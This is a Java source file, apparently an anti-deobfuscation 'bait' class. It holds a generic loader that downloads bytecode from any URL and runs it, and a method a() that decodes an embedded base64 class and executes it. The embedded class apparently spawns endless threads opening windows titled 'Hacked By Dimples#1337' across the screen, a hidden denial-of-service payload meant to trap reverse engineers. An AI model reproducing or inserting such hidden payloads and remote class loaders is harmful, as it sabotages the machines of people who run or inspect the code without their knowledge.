package wiki.mtf;

import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.net.URL;

public class AntiDeobf {
    private static class CustomClassLoader extends ClassLoader {
        public Class<?> load(byte[] buf, int length) {
            return defineClass(null, buf, 0, length);
        }
    }
    public synchronized void loadClassFromStr(String URLSpec) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        URL url = new URL(URLSpec);
        InputStream inputStream = url.openStream();
        byte[] tmpBuf = new byte[1024], buf = new byte[5 * 1024 * 1024];
        int currentLength, length = 0;
        while ((currentLength = inputStream.read(tmpBuf)) > 0) {
            for (int i = 0; i < currentLength; i++) {
                buf[length ++] = tmpBuf[i];
            }
        }

        new CustomClassLoader().load(buf, length).getMethod("load").invoke(null);
    }
    /**
     *  this is a bait string, for reverse eng.
     * @author a114
     */
    public String a() {
//TODO: load a bad class from data url with loadClassFromStr
        try {
            loadClassFromStr("data:application/x-java;base64,yv66vgAAADQAeQoAGAA0CgAXADUHADYKAAMANAoANwA4CgA3ADkHADoSAAAAPwoABwBACgAHAEEHAEIIAEMKAAsARAkARQBGCQBFAEcKAAMASAoABwBJBwBKCgADAEsKAEwATQoATABOCgBMAE8HAFAHAFEBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAD0x3aWtpL210Zi9Cb29rOwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAlmdWNraW5nV1MBAAJyZAEAEkxqYXZhL3V0aWwvUmFuZG9tOwEAA2RpbQEAFExqYXZhL2F3dC9EaW1lbnNpb247AQANU3RhY2tNYXBUYWJsZQcANgcAUgEAEmxhbWJkYSRmdWNraW5nV1MkMAEAKShMamF2YS91dGlsL1JhbmRvbTtMamF2YS9hd3QvRGltZW5zaW9uOylWAQAFZnJhbWUBABBMamF2YS9hd3QvRnJhbWU7BwBTBwBKAQAKU291cmNlRmlsZQEACUJvb2suamF2YQwAGQAaDAAkABoBABBqYXZhL3V0aWwvUmFuZG9tBwBUDABVAFYMAFcAWAEAEGphdmEvbGFuZy9UaHJlYWQBABBCb290c3RyYXBNZXRob2RzDwYAWRAAGg8GAFoMAFsAXAwAGQBdDABeABoBABJqYXZheC9zd2luZy9KRnJhbWUBABZIYWNrZWQgQnkgRGltcGxlcyMxMzM3DAAZAF8HAFIMAGAAYQwAYgBhDABjAGQMAGUAZgEAHmphdmEvbGFuZy9JbnRlcnJ1cHRlZEV4Y2VwdGlvbgwAYwBnBwBTDABoAGkMAGoAaQwAawBsAQANd2lraS9tdGYvQm9vawEAEGphdmEvbGFuZy9PYmplY3QBABJqYXZhL2F3dC9EaW1lbnNpb24BAA5qYXZhL2F3dC9GcmFtZQEAEGphdmEvYXd0L1Rvb2xraXQBABFnZXREZWZhdWx0VG9vbGtpdAEAFCgpTGphdmEvYXd0L1Rvb2xraXQ7AQANZ2V0U2NyZWVuU2l6ZQEAFigpTGphdmEvYXd0L0RpbWVuc2lvbjsKAG0AbgoAFwBvAQADcnVuAQA8KExqYXZhL3V0aWwvUmFuZG9tO0xqYXZhL2F3dC9EaW1lbnNpb247KUxqYXZhL2xhbmcvUnVubmFibGU7AQAXKExqYXZhL2xhbmcvUnVubmFibGU7KVYBAAVzdGFydAEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABmhlaWdodAEAAUkBAAV3aWR0aAEAB25leHRJbnQBAAQoSSlJAQAFc2xlZXABAAQoSilWAQADKClJAQAHc2V0U2l6ZQEABShJSSlWAQALc2V0TG9jYXRpb24BAApzZXRWaXNpYmxlAQAEKFopVgcAcAwAcQB1DAAsAC0BACJqYXZhL2xhbmcvaW52b2tlL0xhbWJkYU1ldGFmYWN0b3J5AQALbWV0YWZhY3RvcnkHAHcBAAZMb29rdXABAAxJbm5lckNsYXNzZXMBAMwoTGphdmEvbGFuZy9pbnZva2UvTWV0aG9kSGFuZGxlcyRMb29rdXA7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9pbnZva2UvTWV0aG9kVHlwZTtMamF2YS9sYW5nL2ludm9rZS9NZXRob2RUeXBlO0xqYXZhL2xhbmcvaW52b2tlL01ldGhvZEhhbmRsZTtMamF2YS9sYW5nL2ludm9rZS9NZXRob2RUeXBlOylMamF2YS9sYW5nL2ludm9rZS9DYWxsU2l0ZTsHAHgBACVqYXZhL2xhbmcvaW52b2tlL01ldGhvZEhhbmRsZXMkTG9va3VwAQAeamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGVzACEAFwAYAAAAAAAEAAEAGQAaAAEAGwAAAC8AAQABAAAABSq3AAGxAAAAAgAcAAAABgABAAAABwAdAAAADAABAAAABQAeAB8AAAAJACAAIQABABsAAAAyAAAAAQAAAAS4AAKxAAAAAgAcAAAACgACAAAACQADAAoAHQAAAAwAAQAAAAQAIgAjAAAAKQAkABoAAQAbAAAAdAAEAAIAAAAjuwADWbcABEu4AAW2AAZMuwAHWSorugAIAAC3AAm2AAqn/+8AAAADABwAAAASAAQAAAANAAgADgAPABAAHQAZAB0AAAAWAAIACAAbACUAJgAAAA8AFAAnACgAAQApAAAACwAB/QAPBwAqBwArEAoALAAtAAEAGwAAAMYABAAEAAAASLsAC1kSDLcADU0qK7QADiu0AA9gEAh8tgAQhbgAEacABE4sKrYAEyq2ABO2ABQsKiu0AA62ABAqK7QAD7YAELYAFSwEtgAWsQABAAoAHgAhABIAAwAcAAAAIgAIAAAAEQAKABMAHgAVACEAFAAiABYALgAXAEIAGABHABkAHQAAACAAAwAAAEgAJQAmAAAAAABIACcAKAABAAoAPgAuAC8AAgApAAAAFgAC/wAhAAMHACoHACsHADAAAQcAMQAAAwAyAAAAAgAzAHQAAAAKAAEAcgB2AHMAGQA7AAAADAABADwAAwA9AD4APQ==");
        } catch (Exception e){

        }
        return "fucker";
    }

}
